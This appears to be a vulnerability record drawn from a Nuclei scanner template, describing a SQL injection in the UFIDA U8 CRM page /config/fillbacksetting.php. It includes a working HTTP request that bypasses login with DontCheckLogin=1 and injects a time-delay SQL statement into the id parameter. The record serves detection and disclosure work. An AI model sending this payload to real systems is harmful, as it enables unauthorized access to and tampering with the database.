# Vulnerability: UFIDA U8 CRM fillbacksetting.php - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`yonyou-u8-crm-tb-sqli.yaml`)

## Description
UFIDA U8-CRM system /config/fillbacksetting.php contains an SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout 20s
GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=bgsesstimeout-;
```

